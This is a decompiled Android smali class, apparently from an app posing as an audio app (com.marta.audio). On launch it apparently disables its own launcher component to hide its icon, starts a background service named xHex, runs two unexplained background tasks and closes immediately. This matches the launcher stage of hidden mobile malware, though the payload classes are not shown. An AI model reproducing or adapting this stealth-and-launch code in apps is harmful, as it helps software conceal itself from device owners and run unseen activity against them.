.class public Lcom/marta/audio/Mot;
.super Landroid/app/Activity;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public a()V
    .locals 5

    new-instance v0, Landroid/content/ComponentName;

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/marta/audio/Mot;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const/4 v2, 0x2

    const/4 v3, 0x1

    new-instance v4, Lcom/marta/audio/b;

    invoke-direct {v4, p0}, Lcom/marta/audio/b;-><init>(Lcom/marta/audio/Mot;)V

    invoke-virtual {v4, v1, v0, v2, v3}, Lcom/marta/audio/b;->a(Landroid/content/pm/PackageManager;Landroid/content/ComponentName;II)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 5

    const/4 v4, 0x0

    const/4 v3, 0x1

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->a()V

    invoke-virtual {p0, v3}, Lcom/marta/audio/Mot;->setRequestedOrientation(I)V

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->getBaseContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lcom/marta/audio/xHex;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/marta/audio/Mot;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v0, Lcom/marta/audio/k;

    invoke-direct {v0}, Lcom/marta/audio/k;-><init>()V

    new-array v1, v3, [Landroid/content/Context;

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->getBaseContext()Landroid/content/Context;

    move-result-object v2

    aput-object v2, v1, v4

    invoke-virtual {v0, v1}, Lcom/marta/audio/k;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    const-string v0, "ola! como estas?"

    new-instance v0, Lcom/marta/audio/g;

    invoke-direct {v0}, Lcom/marta/audio/g;-><init>()V

    new-array v1, v3, [Landroid/content/Context;

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->getBaseContext()Landroid/content/Context;

    move-result-object v2

    aput-object v2, v1, v4

    invoke-virtual {v0, v1}, Lcom/marta/audio/g;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    invoke-virtual {p0}, Lcom/marta/audio/Mot;->finish()V

    return-void
.end method

.method public onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
